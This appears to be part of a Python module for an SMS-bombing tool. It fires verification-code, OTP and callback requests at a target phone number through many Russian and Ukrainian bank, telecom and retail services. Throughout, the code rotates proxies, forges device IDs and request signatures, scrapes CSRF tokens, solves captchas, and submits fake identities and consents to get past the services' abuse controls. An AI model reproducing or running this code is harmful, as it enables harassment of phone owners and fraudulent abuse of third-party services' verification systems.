from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
import logging
import os
import random
import re
import socket
import time
import urllib.parse
import uuid
from dataclasses import dataclass, field
from functools import lru_cache
from pathlib import Path
from typing import Any, Awaitable, Callable, Iterable
from urllib.parse import quote

import aiohttp

import config
from db import parse_phone
from proxies import Proxy, ProxyPool, load_proxies
from recaptcha import RecaptchaCache, RecaptchaV3
from yandex_captcha import YandexCaptcha, YandexCaptchaCache

logger = logging.getLogger(__name__)

_SOCKS_SCHEMES = ("socks5://", "socks5h://", "socks4://", "socks4a://")


def is_socks(proxy: str) -> bool:
    return bool(proxy) and proxy.lower().startswith(_SOCKS_SCHEMES)


CONNECTOR_LIMIT = max(64, int(getattr(config, "http_connector_limit", 512)))
CONNECTOR_LIMIT_PER_HOST = max(4, int(getattr(config, "http_connector_per_host", 16)))


def build_connector(proxy: str = "", limit: int = CONNECTOR_LIMIT) -> aiohttp.BaseConnector:
    if is_socks(proxy):
        try:
            from aiohttp_socks import ProxyConnector
        except ImportError as exc:
            raise RuntimeError(
                "aiohttp-socks is required for socks proxies: pip install aiohttp-socks"
            ) from exc
        return ProxyConnector.from_url(proxy, limit=limit, ssl=False, rdns=True)
    return aiohttp.TCPConnector(
        family=socket.AF_INET,
        limit=limit,
        limit_per_host=CONNECTOR_LIMIT_PER_HOST,
        ssl=False,
        ttl_dns_cache=300,
        keepalive_timeout=45,
        enable_cleanup_closed=True,
    )


def create_session(proxy: str = "", timeout: float = 6.0) -> aiohttp.ClientSession:
    connect = min(timeout, 5.0)
    timeout_obj = aiohttp.ClientTimeout(
        total=None,
        connect=None,
        sock_connect=connect,
        sock_read=max(1.0, timeout),
    )
    return aiohttp.ClientSession(
        connector=build_connector(proxy),
        timeout=timeout_obj,
        auto_decompress=True,
        max_line_size=32768,
        max_field_size=32768,
    )


_TOKEN_RE = re.compile(r"\{\{([A-Z0-9_]+)\}\}")


def variants(digits: str) -> dict[str, str]:
    table = {
        "RAW": digits,
        "PLUS": "+" + digits,
        "NAT": digits[1:] if len(digits) > 1 else "",
        "LAST10": digits[-10:],
    }
    if digits.startswith("7") and len(digits) == 11:
        a, b, c, d = digits[1:4], digits[4:7], digits[7:9], digits[9:11]
        table.update(
            {
                "RU1": f"+7 ({a}) {b}-{c}-{d}",
                "RU2": f"7({a}) {b}-{c}-{d}",
                "RU3": f"+7({a}){b}-{c}-{d}",
                "RU3URL": quote(f"+7({a}){b}-{c}-{d}", safe="()"),
                "RU4": f"+7({a}) {b}-{c}-{d}",
                "RU5": f"+7 {a} {b} {c} {d}",
                "RU6": f"({a}) {b}-{c}-{d}",
                "RU7": f"8({a}) {b}-{c}-{d}",
                "RU8": f"+7({a}) {b}-{c}{d}",
                "RUDASH": f"{a} {b}-{c}-{d}",
            }
        )
    if digits.startswith("380") and len(digits) == 12:
        r = digits
        loc = digits[2:]
        table.update(
            {
                "UALOCAL": loc,
                "UA10": digits[3:],
                "UA1": f"+38 {loc[0:3]} {loc[3:6]} {loc[6:8]} {loc[8:10]}",
                "UA2": f"+380({r[3:5]}){r[5:8]}-{r[8:10]}-{r[10:]}",
                "UA2DASH": f"+380({r[3:5]})-{r[5:8]}-{r[8:10]}-{r[10:]}",
                "UA2B": f"+380 ({r[3:5]}) {r[5:8]}-{r[8:10]}-{r[10:]}",
                "UA3": f"+38({loc[0:3]}) {loc[3:6]}-{loc[6:8]}-{loc[8:10]}",
                "UA4": f"+38({loc[0:3]}){loc[3:]}",
                "UA5": f"+38({loc[0:3]}) {loc[3:6]}-{loc[6:]}",
                "UA6": f"+38 ({loc[0:3]}) {loc[3:6]}-{loc[6:8]}-{loc[8:10]}",
                "UA7": f"+380({loc[0:3]}){loc[3:6]}-{loc[6:8]}-{loc[8:10]}",
                "UA8": f"+38 ({loc[0:3]}) {loc[3:6]} {loc[6:8]} {loc[8:10]}",
                "UA9": f"+380 {r[3:5]} {r[5:8]} {r[8:10]} {r[10:]}",
                "FMTUA2": f"+38({loc[0:3]}){loc[3:6]}-{loc[6:8]}-{loc[8:10]}",
                "UASPACE": f"+380 {loc[1:3]} {loc[3:6]} {loc[6:8]} {loc[8:10]}",
                "UAPAREN": f"+38({loc[0:3]}) {loc[3:6]} {loc[6:8]} {loc[8:10]}",
                "UA_PAREN": f"({loc[0:3]}) {loc[3:6]}-{loc[6:8]}-{loc[8:10]}",
                "UA_PAREN_PLUS": f"({loc[0:3]})+{loc[3:6]}-{loc[6:8]}-{loc[8:10]}",
            }
        )
    return {k: v for k, v in table.items() if v}


def make_formatter(digits: str, extra: dict[str, str] | None = None):
    table = variants(digits)
    if extra:
        table.update(extra)

    def _replace(text: str) -> str:
        if not text or "{{" not in text:
            return text or ""
        return _TOKEN_RE.sub(lambda m: table.get(m.group(1), m.group(0)), text)

    return _replace


def fill_tokens(text: str, tokens: dict[str, str]) -> str:
    if not text or "{{" not in text:
        return text or ""
    return _TOKEN_RE.sub(lambda m: tokens.get(m.group(1), m.group(0)), text)


DYNAMIC_TOKENS = frozenset({"UUID", "EMAIL"})

_EMAIL_NAMES = (
    "anton", "andrii", "dmytro", "oleh", "maksym", "ivan", "taras",
    "serhii", "yurii", "pavlo", "olha", "kateryna", "iryna", "nadiia",
)
_EMAIL_SURNAMES = (
    "shevchenko", "bondar", "tkachenko", "melnyk", "kravchenko",
    "boyko", "savchenko", "rudenko", "moroz", "kovalenko",
)
_EMAIL_DOMAINS = ("gmail.com", "ukr.net", "mail.com", "outlook.com")


def random_email(rng: random.Random) -> str:
    name = rng.choice(_EMAIL_NAMES)
    surname = rng.choice(_EMAIL_SURNAMES)
    return (
        f"{name}.{surname}{rng.randrange(100, 9999)}@{rng.choice(_EMAIL_DOMAINS)}"
    )


def known_tokens() -> set[str]:
    return set(variants("79161234567")) | set(variants("380671234567"))


def unresolved_tokens(text: str) -> set[str]:
    return set(_TOKEN_RE.findall(text or ""))


PREPARE_TOKENS = frozenset({"CHALLENGE", "CSRF", "SESSION"})
YANDEX_TOKENS = frozenset({"YANDEX", "YANDEX_CAPTCHA", "SMARTCAPTCHA"})

_USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"
)
_TIMEOUT = aiohttp.ClientTimeout(total=20)
_BEELINE_START = "https://beeline.ru/login"
_BEELINE_PROCESS = "https://idplogin.beeline.ru/web/v1/process"
_LOVEREPUBLIC_HOME = "https://loverepublic.ru/"
_LOVEREPUBLIC_CSRF = "https://loverepublic.ru/api/mobile1d/csrf"
_LOVEREPUBLIC_COOKIE = "republic-token"
_LOVEREPUBLIC_TOKEN_TTL = 1800.0
_lr_token_lock = asyncio.Lock()
_lr_token_cache: tuple[str, float] = ("", 0.0)


def _loverepublic_token_file() -> Path:
    raw = os.environ.get("LOVEREPUBLIC_TOKEN_FILE", "").strip()
    return Path(raw) if raw else config.base_dir / "loverepublic.token"


def _configured_loverepublic_token() -> str:
    token = os.environ.get("LOVEREPUBLIC_TOKEN", "").strip()
    if token:
        return token
    try:
        return _loverepublic_token_file().read_text(encoding="utf-8").strip()
    except OSError:
        return ""


def _cookie_token(raw: str) -> str:
    if not raw:
        return ""
    marker = _LOVEREPUBLIC_COOKIE + "="
    for part in raw.split(";"):
        part = part.strip()
        if part.startswith(marker):
            return part[len(marker):].strip()
    return ""


async def _discover_loverepublic_token(
    session: aiohttp.ClientSession, *, force: bool = False
) -> str:
    global _lr_token_cache
    now = time.monotonic()
    token, expires = _lr_token_cache
    if not force and token and expires > now:
        return token
    async with _lr_token_lock:
        token, expires = _lr_token_cache
        if not force and token and expires > now:
            return token

        token = _configured_loverepublic_token()
        if not token:
            endpoint = os.environ.get("LOVEREPUBLIC_TOKEN_URL", "").strip()
            if endpoint:
                try:
                    async with session.get(endpoint, timeout=_TIMEOUT) as response:
                        raw = await response.text()
                        token = _cookie_token(raw)
                        if not token:
                            try:
                                payload = json.loads(raw)
                            except (TypeError, ValueError):
                                payload = None
                            if isinstance(payload, dict):
                                for key in ("token", "republic-token", "access_token"):
                                    value = payload.get(key)
                                    if isinstance(value, str) and value.strip():
                                        token = value.strip()
                                        break
                                data = payload.get("data")
                                if not token and isinstance(data, dict):
                                    for key in ("token", "republic-token", "access_token"):
                                        value = data.get(key)
                                        if isinstance(value, str) and value.strip():
                                            token = value.strip()
                                            break
                        token = token or _cookie_token(
                            response.headers.get("set-cookie", "")
                        )
                except Exception as exc:
                    logger.debug("loverepublic: token endpoint failed: %r", exc)

        if not token:
            try:
                async with session.get(
                    _LOVEREPUBLIC_HOME,
                    headers={"user-agent": _USER_AGENT},
                    timeout=_TIMEOUT,
                ) as response:
                    token = _cookie_token(response.headers.get("set-cookie", ""))
                    if not token:
                        for morsel in response.cookies.values():
                            if morsel.key == _LOVEREPUBLIC_COOKIE:
                                token = str(morsel.value or "")
                                break
                    if not token:
                        raw = await response.text()
                        token = _cookie_token(raw)
            except Exception as exc:
                logger.debug("loverepublic: home discovery failed: %r", exc)

        if token:
            _lr_token_cache = (token, now + _LOVEREPUBLIC_TOKEN_TTL)
            logger.info("loverepublic: token obtained dynamically")
        else:
            _lr_token_cache = ("", 0.0)
        return token


def _invalidate_loverepublic_token() -> None:
    global _lr_token_cache
    _lr_token_cache = ("", 0.0)


async def _beeline(session: aiohttp.ClientSession) -> dict[str, str]:
    async with session.get(
        _BEELINE_START,
        headers={"user-agent": _USER_AGENT, "accept-language": "ru-RU,ru;q=0.5"},
        allow_redirects=True,
        timeout=_TIMEOUT,
    ) as response:
        final_url = str(response.url)

    query = urllib.parse.parse_qs(urllib.parse.urlparse(final_url).query)
    challenge = (query.get("login_challenge") or [""])[0]
    if not challenge:
        raise RuntimeError("beeline: login_challenge не выдан")

    async with session.post(
        _BEELINE_PROCESS,
        json={"challenge": challenge, "action": "ACT_INIT", "xbr_token": "", "meta": {}},
        headers={
            "accept": "application/json",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://authentication.beeline.ru",
            "referer": "https://authentication.beeline.ru/",
            "user-agent": _USER_AGENT,
        },
        timeout=_TIMEOUT,
    ) as response:
        if response.status != 200:
            raise RuntimeError(f"beeline: ACT_INIT {response.status}")

    return {"CHALLENGE": challenge}


async def _loverepublic(session: aiohttp.ClientSession) -> dict[str, str]:
    global _lr_token_cache
    token = await _discover_loverepublic_token(session)
    if not token:
        raise RuntimeError(
            "loverepublic: missing republic-token"
        )

    headers = {
        "accept": "application/json",
        "accept-language": "ru-RU,ru;q=0.9",
        "origin": "https://loverepublic.ru",
        "referer": "https://loverepublic.ru/",
        "user-agent": _USER_AGENT,
    }
    for attempt in range(2):
        async with session.get(
            _LOVEREPUBLIC_CSRF,
            headers={**headers, "cookie": f"{_LOVEREPUBLIC_COOKIE}={token}"},
            timeout=_TIMEOUT,
        ) as response:
            status = response.status
            set_cookie = response.headers.get("set-cookie", "")
            payload = await response.json(content_type=None)

        fresh = _cookie_token(set_cookie)
        if fresh and fresh != token:
            token = fresh
            _lr_token_cache = (token, time.monotonic() + _LOVEREPUBLIC_TOKEN_TTL)

        csrf = str(((payload.get("data") or {}).get("csrf")) or "")
        if status == 200 and csrf:
            return {"CSRF": csrf, "SESSION": token}
        if attempt == 0 and status in (401, 403):
            _invalidate_loverepublic_token()
            token = await _discover_loverepublic_token(session, force=True)
            if not token:
                break
            continue
        raise RuntimeError(f"loverepublic: csrf {status}")

    raise RuntimeError("loverepublic: csrf не получен после обновления токена")


PREPARERS = {"beeline": _beeline, "loverepublic": _loverepublic}

PREPARE_TTL = 90.0
PREPARE_FAIL_TTL = 120.0
PREPARE_TIMEOUT = 8.0
_MAX_PREPARE_CACHE = 128
_prepare_cache: dict[str, tuple[float, dict[str, str]]] = {}
_prepare_fail_until: dict[str, float] = {}
_prepare_locks: dict[str, asyncio.Lock] = {}
_prepare_meta_lock = asyncio.Lock()


def _prune_prepare_caches() -> None:
    """Очистка устаревших записей в кешах подготовки"""
    now = time.monotonic()
    # Очищаем истекшие записи
    for name in list(_prepare_cache.keys()):
        if _prepare_cache[name][0] <= now:
            _prepare_cache.pop(name, None)
    for name in list(_prepare_fail_until.keys()):
        if _prepare_fail_until[name] <= now:
            _prepare_fail_until.pop(name, None)
    
    # Если все еще переполнен - удаляем старейшие
    if len(_prepare_cache) > _MAX_PREPARE_CACHE:
        sorted_items = sorted(_prepare_cache.items(), key=lambda x: x[1][0])
        to_remove = len(_prepare_cache) - _MAX_PREPARE_CACHE
        for name, _ in sorted_items[:to_remove]:
            _prepare_cache.pop(name, None)
    
    if len(_prepare_fail_until) > _MAX_PREPARE_CACHE:
        sorted_items = sorted(_prepare_fail_until.items(), key=lambda x: x[1])
        to_remove = len(_prepare_fail_until) - _MAX_PREPARE_CACHE
        for name, _ in sorted_items[:to_remove]:
            _prepare_fail_until.pop(name, None)


async def _provider_lock(name: str) -> asyncio.Lock:
    lock = _prepare_locks.get(name)
    if lock is not None:
        return lock
    async with _prepare_meta_lock:
        return _prepare_locks.setdefault(name, asyncio.Lock())


_RAIF_BASE = "https://id.raiffeisen.ru"
_RAIF_CHAIN = f"{_RAIF_BASE}/api/raif-id/id/chain"
_RAIF_SMS = f"{_RAIF_BASE}/api/raif-id/otp/sms/send"


async def _raiffeisen(
    session: aiohttp.ClientSession,
    digits: str,
    headers: dict[str, str],
    proxy: str | None,
    proxy_auth: aiohttp.BasicAuth | None = None,
) -> tuple[int, bytes]:
    session_id = str(uuid.uuid4())
    base = {
        **headers,
        "User-Agent": _USER_AGENT,
        "X-Device-Id": str(uuid.uuid4()),
        "X-Session-Id": session_id,
        "Referer": (
            f"{_RAIF_BASE}/login?client_id=ro-sso&locale=ru&session_id={session_id}"
        ),
    }

    async def step(
        url: str, data, content_type: str, read_body: bool = False
    ) -> tuple[int, bytes]:
        call = {**base, "X-Request-Id": str(uuid.uuid4()), "Content-Type": content_type}
        async with session.post(
            url, data=data, headers=call, proxy=proxy, proxy_auth=proxy_auth
        ) as response:
            status = response.status
            if read_body and 200 <= status < 300:
                return status, await response.content.read(_MAX_MARKER)
            await _discard(response)
        return status, b""

    form = "application/x-www-form-urlencoded"
    status, _ = await step(_RAIF_CHAIN, {"flow_version": "1"}, form)
    if status != 200:
        return status, b""
    status, _ = await step(_RAIF_CHAIN, {"step_name": "phone", "phone": digits}, form)
    if status != 200:
        return status, b""
    return await step(_RAIF_SMS, b"null", "application/json", read_body=True)


_GM_API = "https://api.greenmoney.ru"
_GM_START = f"{_GM_API}/api/Account/StartRegistration"
_GM_CONFIRM = f"{_GM_API}/api/Account/RegistrationByPhone/Confirm"

_GM_AGREEMENTS = [
    {"AgreementType": kind, "IsSelected": True} for kind in (16, 17, 49, 50, 51, 60)
]


async def _greenmoney(
    session: aiohttp.ClientSession,
    digits: str,
    headers: dict[str, str],
    proxy: str | None,
    proxy_auth: aiohttp.BasicAuth | None = None,
) -> tuple[int, bytes]:
    base = {**headers, "User-Agent": _USER_AGENT}
    start_headers = {**base, "X-ClientRegistrationFeature": "8"}
    params = {"fingerPrint": uuid.uuid4().hex, "regVersion": "2", "source": "site"}

    async with session.get(
        _GM_START, params=params, headers=start_headers, proxy=proxy, proxy_auth=proxy_auth
    ) as response:
        status = response.status
        if status != 200:
            await _discard(response)
            return status, b""
        payload = await response.json(content_type=None)

    session_id = str((payload.get("SessionId") if isinstance(payload, dict) else "") or "")
    if not session_id:
        return status, b""

    body = json.dumps(
        {
            "SessionId": session_id,
            "Passport": {
                "LastName": "Антонов",
                "FirstName": "Антон",
                "MiddleName": "Николаевич",
                "NoMiddleName": False,
                "UserTimeZone": 3,
                "Gender": 0,
            },
            "Phone": f"+{digits}",
            "Agreements": _GM_AGREEMENTS,
        },
        ensure_ascii=False,
    ).encode("utf-8")

    async with session.post(
        _GM_CONFIRM,
        data=body,
        headers={**base, "Content-Type": "application/json"},
        proxy=proxy,
        proxy_auth=proxy_auth,
    ) as response:
        status = response.status
        if 200 <= status < 300:
            return status, await response.content.read(_MAX_MARKER)
        await _discard(response)
        return status, b""


_FORWARD_SPORT_URL = "https://www.forward-sport.ru/local/ajax/callback.php?fancybox=true"
_FORWARD_SPORT_NAMES = (
    "Александр", "Алексей", "Андрей", "Антон", "Артём", "Владимир",
    "Дмитрий", "Евгений", "Иван", "Максим", "Михаил", "Николай",
    "Павел", "Роман", "Сергей", "Юрий",
)
_HIDDEN_INPUT_RE = re.compile(r"<input\b[^>]*>", re.IGNORECASE)
_DATA_REGISTER_RE = re.compile(r'\bdata-register=[\"\']([^\"\']+)[\"\']', re.IGNORECASE)


def _html_attrs(tag: str) -> dict[str, str]:
    return {
        key.lower(): value
        for key, _, value in re.findall(
            r"([:\w-]+)\s*=\s*([\"\'])(.*?)\2", tag, re.DOTALL
        )
    }


async def _forward_sport(
    session: aiohttp.ClientSession,
    digits: str,
    headers: dict[str, str],
    proxy: str | None,
    proxy_auth: aiohttp.BasicAuth | None = None,
) -> tuple[int, bytes]:
    request_headers = {**headers, "User-Agent": _USER_AGENT}
    async with session.get(
        _FORWARD_SPORT_URL, headers=request_headers, proxy=proxy, proxy_auth=proxy_auth
    ) as response:
        if response.status != 200:
            await _discard(response)
            return response.status, b""
        html = await response.text()

    register = _DATA_REGISTER_RE.search(html)
    fields = {
        attrs["name"]: attrs.get("value", "")
        for tag in _HIDDEN_INPUT_RE.findall(html)
        if (attrs := _html_attrs(tag)).get("type", "").lower() == "hidden"
        and attrs.get("name")
    }
    if not register or not fields.get("sessid"):
        raise RuntimeError("forward-sport: поля формы не получены")

    form = aiohttp.FormData()
    form.add_field("data-register", register.group(1))
    for name, value in fields.items():
        form.add_field(name, value)
    formatted = f"+7 ({digits[1:4]}) {digits[4:7]}-{digits[7:9]}-{digits[9:11]}"
    form.add_field("form_text_69", random.choice(_FORWARD_SPORT_NAMES))
    form.add_field("form_text_70", formatted)
    form.add_field("form_textarea_74", "")
    form.add_field("form_checkbox_AGREEMENT[]", "73")
    form.add_field("form_checkbox_AGREEMENT_2[]", "142")
    form.add_field("form_checkbox_AGREEMENT_3[]", "143")
    form.add_field("web_form_submit", "Y")

    async with session.post(
        _FORWARD_SPORT_URL, data=form, headers=request_headers, proxy=proxy, proxy_auth=proxy_auth
    ) as response:
        status = response.status
        if 200 <= status < 300:
            return status, await response.content.read(_MAX_MARKER)
        await _discard(response)
        return status, b""


_PIZZA_SUSHI_WOK_API = "https://api.pizzasushiwok.ru/api/v1"
_MULTIPLEX_LOGIN = "https://auth2.multiplex.ua/login"
_MULTIPLEX_CAPTCHA = "https://auth2.multiplex.ua/captcha"


def _pizza_sushi_wok_signature() -> dict[str, str]:
    device = str(uuid.uuid4())
    timestamp = str(int(time.time()))
    nonce = uuid.uuid4().hex + uuid.uuid4().hex
    message = f"web|{device}|{timestamp}|{nonce}"
    secret = getattr(config, "pizza_sushi_wok_secret", "super_long_web_secret")
    signature = hmac.new(
        secret.encode("utf-8"), message.encode("ascii"), hashlib.sha256
    ).hexdigest()
    return {
        "X-Client-Id": "web",
        "X-Device-Id": device,
        "X-Timestamp": timestamp,
        "X-Nonce": nonce,
        "X-Signature": signature,
    }


async def _pizza_sushi_wok(
    session: aiohttp.ClientSession,
    digits: str,
    headers: dict[str, str],
    proxy: str | None,
    proxy_auth: aiohttp.BasicAuth | None = None,
) -> tuple[int, bytes]:
    request_headers = {
        **headers,
        **_pizza_sushi_wok_signature(),
        "User-Agent": _USER_AGENT,
        "Content-Type": "application/json",
    }
    async with session.post(
        f"{_PIZZA_SUSHI_WOK_API}/auth/token",
        headers=request_headers,
        proxy=proxy,
        proxy_auth=proxy_auth,
    ) as response:
        if response.status != 200:
            await _discard(response)
            return response.status, b""
        try:
            payload = await response.json(content_type=None)
            access_token = payload["access_token"]
        except (ValueError, KeyError, TypeError):
            return response.status, b'{"ok":false}'

    async with session.post(
        f"{_PIZZA_SUSHI_WOK_API}/user/request",
        params={"phone": digits},
        headers={**request_headers, "Authorization": f"Bearer {access_token}"},
        proxy=proxy,
        proxy_auth=proxy_auth,
    ) as response:
        status = response.status
        if 200 <= status < 300:
            return status, await response.content.read(_MAX_MARKER)
        await _discard(response)
        return status, b""
async def _multiplex(
    session: aiohttp.ClientSession,
    digits: str,
    headers: dict[str, str],
    proxy: str | None,
    recaptcha: RecaptchaCache,
    settings: RecaptchaV3,
    solver_proxy: str | None,
    proxy_auth: aiohttp.BasicAuth | None = None,
) -> tuple[int, bytes]:
    request_headers = {**headers, "User-Agent": _USER_AGENT}
    async with session.post(
        _MULTIPLEX_LOGIN,
        json={"login": digits},
        headers=request_headers,
        proxy=proxy,
        proxy_auth=proxy_auth,
    ) as response:
        if response.status != 200:
            await _discard(response)
            return response.status, b""

    token = await recaptcha.token("Multiplex_UA_SMS", settings, solver_proxy)
    async with session.post(
        _MULTIPLEX_CAPTCHA,
        json={"token": token},
        headers=request_headers,
        proxy=proxy,
        proxy_auth=proxy_auth,
    ) as response:
        status = response.status
        if 200 <= status < 300:
            return status, await response.content.read(_MAX_MARKER)
        await _discard(response)
        return status, b""


_KYIVSTAR_BASE = "https://clients.production.vidmind.com/vidmind-stb-ws"
_KYIVSTAR_LOGIN = f"{_KYIVSTAR_BASE}/api/v1/authentication/login"
_KYIVSTAR_OTP = f"{_KYIVSTAR_BASE}/api/v2/otp"
_KYIVSTAR_USER = r"557455cfe4b04ad886a6ae41\anonymous"


async def _kyivstar(
    session: aiohttp.ClientSession,
    digits: str,
    headers: dict[str, str],
    proxy: str | None,
    proxy_auth: aiohttp.BasicAuth | None = None,
) -> tuple[int, bytes]:
    request_headers = {**headers, "User-Agent": _USER_AGENT}
    form = f"username={_KYIVSTAR_USER}&password=anonymous"
    async with session.post(
        _KYIVSTAR_LOGIN,
        data=form.encode(),
        headers={**request_headers, "Content-Type": "application/x-www-form-urlencoded"},
        proxy=proxy,
        proxy_auth=proxy_auth,
    ) as response:
        status = response.status
        await _discard(response)
        if status != 200:
            return status, b""

    async with session.post(
        _KYIVSTAR_OTP,
        json={"phoneNumber": digits, "language": "RU"},
        headers=request_headers,
        proxy=proxy,
        proxy_auth=proxy_auth,
    ) as response:
        status = response.status
        chunk = await response.content.read(_MAX_MARKER)
        return status, chunk


CHAINS: dict[str, Any] = {
    "raiffeisen": _raiffeisen,
    "greenmoney": _greenmoney,
    "forward_sport": _forward_sport,
    "pizza_sushi_wok": _pizza_sushi_wok,
    "multiplex": _multiplex,
    "kyivstar": _kyivstar,
}


async def prepare_tokens(
    session: aiohttp.ClientSession,
    providers: set[str] | frozenset[str],
) -> dict[str, dict[str, str]]:
    async def _one(name: str) -> tuple[str, dict[str, str] | None]:
        if name not in PREPARERS:
            return name, None
        now = time.monotonic()
        cached = _prepare_cache.get(name)
        if cached is not None and cached[0] > now:
            return name, dict(cached[1])
        if _prepare_fail_until.get(name, 0.0) > now:
            return name, None

        lock = await _provider_lock(name)
        async with lock:
            now = time.monotonic()
            cached = _prepare_cache.get(name)
            if cached is not None and cached[0] > now:
                return name, dict(cached[1])
            if _prepare_fail_until.get(name, 0.0) > now:
                return name, None
            try:
                values = await asyncio.wait_for(PREPARERS[name](session), PREPARE_TIMEOUT)
            except Exception as exc:
                _prepare_fail_until[name] = time.monotonic() + PREPARE_FAIL_TTL
                _prepare_cache.pop(name, None)
                logger.warning("prepare %s failed: %r", name, exc)
                return name, None
            _prepare_fail_until.pop(name, None)
            _prepare_cache[name] = (
                time.monotonic() + PREPARE_TTL,
                dict(values),
            )
            # Периодическая очистка кешей
            if len(_prepare_cache) >= _MAX_PREPARE_CACHE:
                _prune_prepare_caches()
            return name, values

    prepared: dict[str, dict[str, str]] = {}
    results = await asyncio.gather(*(_one(name) for name in sorted(providers)))
    for name, values in results:
        if values is not None:
            prepared[name] = values
    return prepared


_CSRF_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent": _USER_AGENT,
}
_CSRF_DEFAULT_REGEX = r'name="_token"\s+value="([^"]+)"'
_csrf_cache: dict[tuple[int, str, str], tuple[float, str]] = {}
_csrf_locks: dict[tuple[int, str, str], asyncio.Lock] = {}
_csrf_meta_lock = asyncio.Lock()


@dataclass(frozen=True, slots=True)
class CsrfSource:
    url: str
    regex: str = _CSRF_DEFAULT_REGEX
    ttl: float = 300.0
    headers: dict[str, str] = field(default_factory=dict)

    @classmethod
    def from_raw(cls, raw: Any) -> "CsrfSource":
        if isinstance(raw, str):
            raw = {"url": raw}
        if not isinstance(raw, dict):
            raise TemplateError("csrf должен быть объектом или строкой URL")
        url = str(raw.get("url") or "").strip()
        if not url.startswith(("http://", "https://")):
            raise TemplateError(f"csrf: битый url {url!r}")
        regex = str(raw.get("regex") or _CSRF_DEFAULT_REGEX)
        try:
            re.compile(regex)
        except re.error as exc:
            raise TemplateError(f"csrf: битый regex: {exc}") from exc
        try:
            ttl = float(raw.get("ttl", 300.0))
        except (TypeError, ValueError) as exc:
            raise TemplateError("csrf: ttl должен быть числом") from exc
        try:
            headers = {str(k): str(v) for k, v in (raw.get("headers") or {}).items()}
        except (TypeError, ValueError) as exc:
            raise TemplateError(f"csrf: битые headers: {exc}") from exc
        return cls(url=url, regex=regex, ttl=max(0.0, ttl), headers=headers)


async def csrf_token(
    session: aiohttp.ClientSession,
    source: CsrfSource,
    proxy_kwargs: dict | None = None,
) -> str:
    key = (id(session), source.url, source.regex)
    now = time.monotonic()
    cached = _csrf_cache.get(key)
    if cached is not None and cached[0] > now:
        return cached[1]

    lock = _csrf_locks.get(key)
    if lock is None:
        async with _csrf_meta_lock:
            lock = _csrf_locks.setdefault(key, asyncio.Lock())

    async with lock:
        now = time.monotonic()
        cached = _csrf_cache.get(key)
        if cached is not None and cached[0] > now:
            return cached[1]
        kwargs = dict(proxy_kwargs or {})
        headers = {**_CSRF_HEADERS, **source.headers}
        async with session.get(
            source.url,
            headers=headers,
            allow_redirects=True,
            timeout=_TIMEOUT,
            **kwargs,
        ) as response:
            status = response.status
            text = await response.text(errors="replace")
        if status >= 400:
            raise RuntimeError(f"csrf: {source.url} -> {status}")
        match = re.search(source.regex, text)
        if match is None or not match.group(1):
            raise RuntimeError(f"csrf: токен не найден на {source.url}")
        token = match.group(1)
        if len(_csrf_cache) > 256:
            for stale in [k for k, v in _csrf_cache.items() if v[0] <= now]:
                _csrf_cache.pop(stale, None)
                _csrf_locks.pop(stale, None)
        _csrf_cache[key] = (now + source.ttl, token)
        return token


_base = Path(__file__).resolve().parent
DEFAULT_SERVICES_PATH = (
    _base / "configs" / "services.json"
    if (_base / "configs" / "services.json").exists()
    else _base / "services.json"
)
DEFAULT_PROXIES_PATH = (
    _base / "configs" / "proxies.json"
    if (_base / "configs" / "proxies.json").exists()
    else _base / "configs" / "proxies.txt"
    if (_base / "configs" / "proxies.txt").exists()
    else _base / "proxies.json"
    if (_base / "proxies.json").exists()
    else _base / "proxies.txt"
)

_COUNTRIES = frozenset({"RU", "UA"})
_METHODS = frozenset({"GET", "POST"})


class TemplateError(ValueError):
    pass


@dataclass(frozen=True, slots=True)
class Template:
    name: str
    country: str
    method: str
    url: str
    headers: dict[str, str] = field(default_factory=dict)
    body: str = ""
    content_type: str = ""
    needs_prepare: bool = False
    has_phone: bool = True
    prepare: str = ""
    api_error: str = ""
    api_ok: str = ""
    chain: str = ""
    recaptcha_v3: RecaptchaV3 | None = None
    yandex_captcha: YandexCaptcha | None = None
    csrf: CsrfSource | None = None
    vip: bool = False

    @classmethod
    def from_raw(cls, raw: dict[str, Any]) -> "Template":
        try:
            name = str(raw["name"]).strip()
            tpl = cls(
                name=name,
                country=str(raw.get("country", "")).upper(),
                method=str(raw.get("method", "POST")).upper(),
                url=str(raw.get("url", "")).strip(),
                headers={str(k): str(v) for k, v in (raw.get("headers") or {}).items()},
                body=str(raw.get("body") or ""),
                content_type=str(raw.get("content_type") or ""),
                needs_prepare=bool(raw.get("needs_prepare", False)),
                has_phone=bool(raw.get("has_phone", True)),
                prepare=str(raw.get("prepare") or "").strip(),
                api_error=str(raw.get("api_error") or ""),
                api_ok=str(raw.get("api_ok") or ""),
                chain=str(raw.get("chain") or "").strip(),
                recaptcha_v3=(
                    RecaptchaV3.from_raw(raw["recaptcha_v3"])
                    if raw.get("recaptcha_v3")
                    else None
                ),
                yandex_captcha=(
                    YandexCaptcha.from_raw(raw["yandex_captcha"])
                    if raw.get("yandex_captcha")
                    else None
                ),
                csrf=(
                    CsrfSource.from_raw(raw["csrf"]) if raw.get("csrf") else None
                ),
                vip=bool(raw.get("vip", False)),
            )
        except (KeyError, TypeError, AttributeError) as exc:
            raise TemplateError(f"битая запись шаблона: {raw!r}") from exc
        except ValueError as exc:
            raise TemplateError(f"{name}: {exc}") from exc

        if not tpl.name:
            raise TemplateError("у шаблона пустое имя")
        if tpl.country not in _COUNTRIES:
            raise TemplateError(f"{tpl.name}: неизвестная страна {tpl.country!r}")
        if tpl.method not in _METHODS:
            raise TemplateError(f"{tpl.name}: неподдерживаемый метод {tpl.method}")
        if not tpl.url.startswith(("http://", "https://")):
            raise TemplateError(f"{tpl.name}: битый url {tpl.url!r}")
        if tpl.prepare and tpl.prepare not in PREPARERS:
            raise TemplateError(f"{tpl.name}: неизвестный prepare {tpl.prepare!r}")
        if tpl.needs_prepare and not tpl.prepare:
            raise TemplateError(f"{tpl.name}: needs_prepare без prepare")
        if tpl.chain and tpl.chain not in CHAINS:
            raise TemplateError(f"{tpl.name}: неизвестная цепочка {tpl.chain!r}")
        if tpl.chain and tpl.prepare:
            raise TemplateError(f"{tpl.name}: цепочка не совмещается с prepare")
        if tpl.chain and not tpl.has_phone:
            raise TemplateError(f"{tpl.name}: цепочке нужен номер (has_phone)")
